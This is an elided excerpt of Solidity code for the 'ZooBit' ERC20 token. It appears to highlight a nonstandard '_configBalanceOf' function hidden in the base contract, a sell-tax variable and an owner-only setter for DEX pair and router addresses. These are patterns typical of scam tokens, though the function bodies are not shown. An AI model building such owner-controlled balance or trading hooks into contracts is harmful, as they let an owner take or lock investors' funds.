...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _configBalanceOf(address account, uint256 amount) internal virtual {
...
contract ZooBit is ERC20, ERC20Burnable, ReentrancyGuard, Ownable {
    using SafeMath for uint256;

    uint256 public dexSellTaxFee = 0;
     ...
     * construction.
     */
    constructor() ERC20("ZooBit.Org", "ZB") {
    ...
    function configAllAddress(address _pairAddress, address _routerAddress) public onlyOwner {
